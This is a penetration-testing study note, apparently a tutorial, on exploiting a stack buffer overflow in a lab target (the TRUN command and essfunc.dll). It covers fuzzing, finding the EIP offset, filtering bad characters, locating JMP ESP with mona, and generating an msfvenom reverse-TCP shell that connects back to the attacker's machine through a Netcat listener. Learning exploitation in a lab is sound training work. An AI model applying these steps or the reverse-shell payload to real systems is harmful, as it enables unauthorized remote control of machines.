# Buffer Overflow

## Note: Entry Point Could Be Wrong

* the entry point with Immunity Debugger may not start at the actual start of the program, so you can search for strings from the program to find the entry point
* right click on the disassembly window and "Search For" -> "All Referenced Text Strings" -> Right Click

## Tools to Find Target Return Address

* First, copy the DLLs you want to attack, from the target machine to the attacking machine
* disassemblers
* msfpescan (apart of the Metasploit framework)

## First, Use a Python Script

* fuzz the command and find the byte value that it crashed the program with Immunity Debugger
* the python script will tell you when the app crashes and around what bytes

![](<../.gitbook/assets/Buffer Overflow Pic 0.png>)

![](<../.gitbook/assets/Buffer Overflow Pic 1.png>)

## Metasploit Module, Run Without Opening msfconsole

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 
#(3000 is the Byte value where the program crashed)
```

## Run it Again with the Python Script, but with the New Fffset

* notice how the "TRUN" command now has "/.:/" behind it
* this is because of we found that value within Immunity Debugger when we crashed it the first time

![](<../.gitbook/assets/Buffer Overflow Pic 2.png>)

## Check Immunity Bugger for “EIP” to be overwritten with a Value

* take that value and run this new command
* this finds the offset

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset -l 3000 -q 386F4337
#(this -q value is what value was left within the EIP)
```

* it will give us the exact offset byte value, this example will be 2003

## Overwrite the EIP

* rewrite the script
* “A” \* 2003 is to overwrite the buffer up until the EPI
* “B” \* 4 is to confirm we have the right spot by putting in different values
* EAX and EBP should be all A's
* EPI should be all B's
* remember it is HEX CODE!

![](<../.gitbook/assets/Buffer Overflow Pic 3.png>)

![](<../.gitbook/assets/Buffer Overflow Pic 4.png>)

## Finding Bad Characters

* What characters are good and bad for the shell code?

```
badChars = (
"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"
"\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f"
"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f"
"\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f"
"\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f"
"\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f"
"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f"
"\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f"
"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f"
"\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f"
"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf"
"\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf"
"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf"
"\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf"
"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef"
"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"
)
```

### Edit the script

![](<../.gitbook/assets/Buffer Overflow Pic 5.png>)

* run the script and crash the program again, which is okay
* in the “Registers” section of Immunity Debugger, right click ESP and click "Follow in Hex Dump"
* Look for what is out of place, in this case, B0 is the odd one
* it should go in order, 01 02 03, etc.
* NULL BYTE = 00, IT IS ALWAYS A BAD CHARACTER. EVEN IF YOU FIND NO BAD CHARACTERS 00 IS ALWAYS BAD

![](<../.gitbook/assets/Buffer Overflow Pic 6 (1).png>)

## Finding the Right Module

* This is when you are looking for a DLL, or something similar, that has no memory protections
* “Mona Modules” on Github is a tool that is used to find the right place
* paste it in “This PC, C Drive, Program Files (x86), Immunity Inc, Immunity Debugger, PyCommands Folder”
* Now, on the bottom of Immunity Debugger, you search “!mona modules”
* look for a path that is attached to the program you are breaking, and also has FALSE for all memory protections

![](<../.gitbook/assets/Buffer Overflow Pic 7.png>)

### Now we go to Kali Linux, to get the Jump Code

```bash
“locate nasm_shell”
“/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb”
```

* in the shell, type “JMP ESP”
* copy the results, which in this case is FFE4

### Go Back to Immunity Debugger and in the Bottom Search

```bash
!mona find -s ”\xff\xe4" -m essfunc.dll #<- essfunc.dll is the dll it found to be vulnerable
```

![](<../.gitbook/assets/Buffer Overflow Pic 8.png>)

### It Displays Results, and Start at the Top and Go Down the List with the Following Steps

* go to Kali Linux and edit the Python script again
* keep in mind the Return Address

![](<../.gitbook/assets/Buffer Overflow Pic 9.png>)

go back to Immunity Debugger, and click on the Blue Arrow next to the Red Arrows and type in the Return Address, then set a break point there (F2 for Windows)

* click play
* Run the new Python script, and notice how Immunity Bugger has paused. Congrats we control the EIP!

### Now use msfvenom to create a shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attack machine IP> LPORT=4444 EXITFUNC=thread -f c -a x86 -b ”\x00" #(f is filetype, a is architecture, b is bad characters and where you would put them)
```

* once executed, copy the “unsigned char buf\[]” values without the semi-colon
* now, once again edit the Python script
* add a variable “overflow" to the top and paste in the values surrounded by () parenthesis
* add padding and “overflow” to “shellcode”
* 32 is the padding value which can be lowered if working with small sizes (padding makes the buffer overflow work better)

![](<../.gitbook/assets/Buffer Overflow Pic 10.png>)

* set up a Netcat listener with the same ports you put within “LPORT” with your shell code
* make sure the Terminal App is running, then run the Python script

## Resources

* [The Cyber Mentor's](https://www.youtube.com/playlist?list=PLLKT\_\_MCUeix3O0DPbmuaRuR\_4Hxo4m3G) buffer overflow playlist
* [https://www.youtube.com/watch?v=OOkU7to0Ty4\&ab\_channel=JesseK](https://www.youtube.com/watch?v=OOkU7to0Ty4\&ab\_channel=JesseK)
* [https://www.youtube.com/watch?v=GnUcfbBr7d0\&t=3s\&ab\_channel=AnonVenus](https://www.youtube.com/watch?v=GnUcfbBr7d0\&t=3s\&ab\_channel=AnonVenus)
